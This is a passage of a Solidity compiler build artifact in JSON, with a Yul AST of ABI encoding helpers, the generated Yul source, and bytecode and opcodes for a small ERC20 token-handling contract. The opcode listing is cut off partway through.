																				"src": "2200:1:2",
																				"type": "",
																				"value": "0"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "2185:3:2"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "2185:17:2"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_address_to_t_address_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "2132:43:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "2132:71:2"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2132:71:2"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value1",
																		"nodeType": "YulIdentifier",
																		"src": "2257:6:2"
																	},
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "2270:9:2"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "2281:2:2",
																				"type": "",
																				"value": "32"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "2266:3:2"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "2266:18:2"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_uint256_to_t_uint256_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "2213:43:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "2213:72:2"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2213:72:2"
														}
													]
												},
												"name": "abi_encode_tuple_t_address_t_uint256__to_t_address_t_uint256__fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "2050:9:2",
														"type": ""
													},
													{
														"name": "value1",
														"nodeType": "YulTypedName",
														"src": "2062:6:2",
														"type": ""
													},
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "2070:6:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nodeType": "YulTypedName",
														"src": "2081:4:2",
														"type": ""
													}
												],
												"src": "1960:332:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2409:137:2",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "2419:26:2",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "2431:9:2"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2442:2:2",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "2427:3:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "2427:18:2"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "2419:4:2"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value0",
																		"nodeType": "YulIdentifier",
																		"src": "2512:6:2"
																	},
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "2525:9:2"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "2536:1:2",
																				"type": "",
																				"value": "0"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "2521:3:2"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "2521:17:2"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_contract$_IERC20_$77_to_t_address_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "2455:56:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "2455:84:2"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2455:84:2"
														}
													]
												},
												"name": "abi_encode_tuple_t_contract$_IERC20_$77__to_t_address__fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "2381:9:2",
														"type": ""
													},
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "2393:6:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nodeType": "YulTypedName",
														"src": "2404:4:2",
														"type": ""
													}
												],
												"src": "2298:248:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2650:124:2",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "2660:26:2",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "2672:9:2"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2683:2:2",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "2668:3:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "2668:18:2"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "2660:4:2"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value0",
																		"nodeType": "YulIdentifier",
																		"src": "2740:6:2"
																	},
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "2753:9:2"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "2764:1:2",
																				"type": "",
																				"value": "0"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "2749:3:2"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "2749:17:2"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_uint256_to_t_uint256_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "2696:43:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "2696:71:2"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2696:71:2"
														}
													]
												},
												"name": "abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "2622:9:2",
														"type": ""
													},
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "2634:6:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nodeType": "YulTypedName",
														"src": "2645:4:2",
														"type": ""
													}
												],
												"src": "2552:222:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2825:51:2",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "2835:35:2",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "2864:5:2"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint160",
																	"nodeType": "YulIdentifier",
																	"src": "2846:17:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "2846:24:2"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "2835:7:2"
																}
															]
														}
													]
												},
												"name": "cleanup_t_address",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "2807:5:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "2817:7:2",
														"type": ""
													}
												],
												"src": "2780:96:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2924:48:2",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "2934:32:2",
															"value": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "2959:5:2"
																			}
																		],
																		"functionName": {
																			"name": "iszero",
																			"nodeType": "YulIdentifier",
																			"src": "2952:6:2"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "2952:13:2"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nodeType": "YulIdentifier",
																	"src": "2945:6:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "2945:21:2"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "2934:7:2"
																}
															]
														}
													]
												},
												"name": "cleanup_t_bool",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "2906:5:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "2916:7:2",
														"type": ""
													}
												],
												"src": "2882:90:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "3023:81:2",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "3033:65:2",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "3048:5:2"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "3055:42:2",
																		"type": "",
																		"value": "0xffffffffffffffffffffffffffffffffffffffff"
																	}
																],
																"functionName": {
																	"name": "and",
																	"nodeType": "YulIdentifier",
																	"src": "3044:3:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "3044:54:2"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "3033:7:2"
																}
															]
														}
													]
												},
												"name": "cleanup_t_uint160",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "3005:5:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "3015:7:2",
														"type": ""
													}
												],
												"src": "2978:126:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "3155:32:2",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "3165:16:2",
															"value": {
																"name": "value",
																"nodeType": "YulIdentifier",
																"src": "3176:5:2"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "3165:7:2"
																}
															]
														}
													]
												},
												"name": "cleanup_t_uint256",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "3137:5:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "3147:7:2",
														"type": ""
													}
												],
												"src": "3110:77:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "3266:79:2",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "3276:63:2",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "3333:5:2"
																	}
																],
																"functionName": {
																	"name": "convert_t_contract$_IERC20_$77_to_t_uint160",
																	"nodeType": "YulIdentifier",
																	"src": "3289:43:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "3289:50:2"
															},
															"variableNames": [
																{
																	"name": "converted",
																	"nodeType": "YulIdentifier",
																	"src": "3276:9:2"
																}
															]
														}
													]
												},
												"name": "convert_t_contract$_IERC20_$77_to_t_address",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "3246:5:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "converted",
														"nodeType": "YulTypedName",
														"src": "3256:9:2",
														"type": ""
													}
												],
												"src": "3193:152:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "3424:53:2",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "3434:37:2",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "3465:5:2"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint160",
																	"nodeType": "YulIdentifier",
																	"src": "3447:17:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "3447:24:2"
															},
															"variableNames": [
																{
																	"name": "converted",
																	"nodeType": "YulIdentifier",
																	"src": "3434:9:2"
																}
															]
														}
													]
												},
												"name": "convert_t_contract$_IERC20_$77_to_t_uint160",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "3404:5:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "converted",
														"nodeType": "YulTypedName",
														"src": "3414:9:2",
														"type": ""
													}
												],
												"src": "3351:126:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "3523:76:2",
													"statements": [
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "3577:16:2",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "3586:1:2",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "3589:1:2",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nodeType": "YulIdentifier",
																				"src": "3579:6:2"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "3579:12:2"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "3579:12:2"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "3546:5:2"
																			},
																			{
																				"arguments": [
																					{
																						"name": "value",
																						"nodeType": "YulIdentifier",
																						"src": "3568:5:2"
																					}
																				],
																				"functionName": {
																					"name": "cleanup_t_bool",
																					"nodeType": "YulIdentifier",
																					"src": "3553:14:2"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "3553:21:2"
																			}
																		],
																		"functionName": {
																			"name": "eq",
																			"nodeType": "YulIdentifier",
																			"src": "3543:2:2"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "3543:32:2"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nodeType": "YulIdentifier",
																	"src": "3536:6:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "3536:40:2"
															},
															"nodeType": "YulIf",
															"src": "3533:2:2"
														}
													]
												},
												"name": "validator_revert_t_bool",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "3516:5:2",
														"type": ""
													}
												],
												"src": "3483:116:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "3648:79:2",
													"statements": [
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "3705:16:2",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "3714:1:2",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "3717:1:2",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nodeType": "YulIdentifier",
																				"src": "3707:6:2"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "3707:12:2"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "3707:12:2"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "3671:5:2"
																			},
																			{
																				"arguments": [
																					{
																						"name": "value",
																						"nodeType": "YulIdentifier",
																						"src": "3696:5:2"
																					}
																				],
																				"functionName": {
																					"name": "cleanup_t_uint256",
																					"nodeType": "YulIdentifier",
																					"src": "3678:17:2"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "3678:24:2"
																			}
																		],
																		"functionName": {
																			"name": "eq",
																			"nodeType": "YulIdentifier",
																			"src": "3668:2:2"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "3668:35:2"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nodeType": "YulIdentifier",
																	"src": "3661:6:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "3661:43:2"
															},
															"nodeType": "YulIf",
															"src": "3658:2:2"
														}
													]
												},
												"name": "validator_revert_t_uint256",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "3641:5:2",
														"type": ""
													}
												],
												"src": "3605:122:2"
											}
										]
									},
									"contents": "{\n\n    function abi_decode_t_bool_fromMemory(offset, end) -> value {\n        value := mload(offset)\n        validator_revert_t_bool(value)\n    }\n\n    function abi_decode_t_uint256_fromMemory(offset, end) -> value {\n        value := mload(offset)\n        validator_revert_t_uint256(value)\n    }\n\n    function abi_decode_tuple_t_bool_fromMemory(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert(0, 0) }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_bool_fromMemory(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function abi_decode_tuple_t_uint256_fromMemory(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert(0, 0) }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_uint256_fromMemory(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function abi_encode_t_address_to_t_address_fromStack(value, pos) {\n        mstore(pos, cleanup_t_address(value))\n    }\n\n    function abi_encode_t_contract$_IERC20_$77_to_t_address_fromStack(value, pos) {\n        mstore(pos, convert_t_contract$_IERC20_$77_to_t_address(value))\n    }\n\n    function abi_encode_t_uint256_to_t_uint256_fromStack(value, pos) {\n        mstore(pos, cleanup_t_uint256(value))\n    }\n\n    function abi_encode_tuple_t_address__to_t_address__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_address_to_t_address_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function abi_encode_tuple_t_address_t_address_t_uint256__to_t_address_t_address_t_uint256__fromStack_reversed(headStart , value2, value1, value0) -> tail {\n        tail := add(headStart, 96)\n\n        abi_encode_t_address_to_t_address_fromStack(value0,  add(headStart, 0))\n\n        abi_encode_t_address_to_t_address_fromStack(value1,  add(headStart, 32))\n\n        abi_encode_t_uint256_to_t_uint256_fromStack(value2,  add(headStart, 64))\n\n    }\n\n    function abi_encode_tuple_t_address_t_uint256__to_t_address_t_uint256__fromStack_reversed(headStart , value1, value0) -> tail {\n        tail := add(headStart, 64)\n\n        abi_encode_t_address_to_t_address_fromStack(value0,  add(headStart, 0))\n\n        abi_encode_t_uint256_to_t_uint256_fromStack(value1,  add(headStart, 32))\n\n    }\n\n    function abi_encode_tuple_t_contract$_IERC20_$77__to_t_address__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_contract$_IERC20_$77_to_t_address_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_uint256_to_t_uint256_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function cleanup_t_address(value) -> cleaned {\n        cleaned := cleanup_t_uint160(value)\n    }\n\n    function cleanup_t_bool(value) -> cleaned {\n        cleaned := iszero(iszero(value))\n    }\n\n    function cleanup_t_uint160(value) -> cleaned {\n        cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)\n    }\n\n    function cleanup_t_uint256(value) -> cleaned {\n        cleaned := value\n    }\n\n    function convert_t_contract$_IERC20_$77_to_t_address(value) -> converted {\n        converted := convert_t_contract$_IERC20_$77_to_t_uint160(value)\n    }\n\n    function convert_t_contract$_IERC20_$77_to_t_uint160(value) -> converted {\n        converted := cleanup_t_uint160(value)\n    }\n\n    function validator_revert_t_bool(value) {\n        if iszero(eq(value, cleanup_t_bool(value))) { revert(0, 0) }\n    }\n\n    function validator_revert_t_uint256(value) {\n        if iszero(eq(value, cleanup_t_uint256(value))) { revert(0, 0) }\n    }\n\n}\n",
									"id": 2,
									"language": "Yul",
									"name": "#utility.yul"
								}
							],
							"immutableReferences": {},
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b50600436106100415760003560e01c806314f719d0146100465780637ca2474e14610064578063b69ef8a81461006e575b600080fd5b61004e61008c565b60405161005b919061043a565b60405180910390f35b61006c6100b0565b005b61007661023f565b6040516100839190610455565b60405180910390f35b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60006100ba61023f565b905060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663095ea7b330836040518363ffffffff1660e01b8152600401610117929190610411565b602060405180830381600087803b15801561013157600080fd5b505af1158015610145573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906101699190610340565b5060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166323b872dd600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1630846040518463ffffffff1660e01b81526004016101e9939291906103da565b602060405180830381600087803b15801561020357600080fd5b505af1158015610217573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061023b9190610340565b5050565b60008060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166370a08231600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff166040518263ffffffff1660e01b81526004016102bd91906103bf565b60206040518083038186803b1580156102d557600080fd5b505afa1580156102e9573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061030d9190610369565b90508091505090565b600081519050610325816104dc565b92915050565b60008151905061033a816104f3565b92915050565b60006020828403121561035257600080fd5b600061036084828501610316565b91505092915050565b60006020828403121561037b57600080fd5b60006103898482850161032b565b91505092915050565b61039b81610470565b82525050565b6103aa816104b8565b82525050565b6103b9816104ae565b82525050565b60006020820190506103d46000830184610392565b92915050565b60006060820190506103ef6000830186610392565b6103fc6020830185610392565b61040960408301846103b0565b949350505050565b60006040820190506104266000830185610392565b61043360208301846103b0565b9392505050565b600060208201905061044f60008301846103a1565b92915050565b600060208201905061046a60008301846103b0565b92915050565b600061047b8261048e565b9050919050565b60008115159050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b60006104c3826104ca565b9050919050565b60006104d58261048e565b9050919050565b6104e581610482565b81146104f057600080fd5b50565b6104fc816104ae565b811461050757600080fd5b5056fea26469706673582212207a32175784b7f2aadd0f0d263ef2c80870a1533cb03323e173aefa95659d981f64736f6c63430008000033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x41 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x14F719D0 EQ PUSH2 0x46 JUMPI DUP1 PUSH4 0x7CA2474E EQ PUSH2 0x64 JUMPI DUP1 PUSH4 0xB69EF8A8 EQ PUSH2 0x6E JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x4E PUSH2 0x8C JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x5B SWAP2 SWAP1 PUSH2 0x43A JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x6C PUSH2 0xB0 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x76 PUSH2 0x23F JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x83 SWAP2 SWAP1 PUSH2 0x455 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH2 0xBA PUSH2 0x23F JUMP JUMPDEST SWAP1 POP PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x95EA7B3 ADDRESS DUP4 PUSH1 0x40 MLOAD DUP4 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x117 SWAP3 SWAP2 SWAP1 PUSH2 0x411 JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x131 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x145 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x169 SWAP2 SWAP1 PUSH2 0x340 JUMP JUMPDEST POP PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x23B872DD PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND ADDRESS DUP5 PUSH1 0x40 MLOAD DUP5 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x1E9 SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0x3DA JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x203 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x217 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x23B SWAP2 SWAP1 PUSH2 0x340 JUMP JUMPDEST POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x70A08231 PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x2BD SWAP2 SWAP1 PUSH2 0x3BF JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x2D5 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x2E9 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x30D SWAP2 SWAP1 PUSH2 0x369 JUMP JUMPDEST SWAP1 POP DUP1 SWAP2 POP POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0x325 DUP2 PUSH2 0x4DC JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0x33A DUP2 PUSH2 0x4F3 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x352 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x360 DUP5 DUP3 DUP6 ADD PUSH2 0x316 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x37B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x389 DUP5 DUP3 DUP6 ADD PUSH2 0x32B JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x39B DUP2 PUSH2 0x470 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH2 0x3AA DUP2 PUSH2 0x4B8 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH2 0x3B9 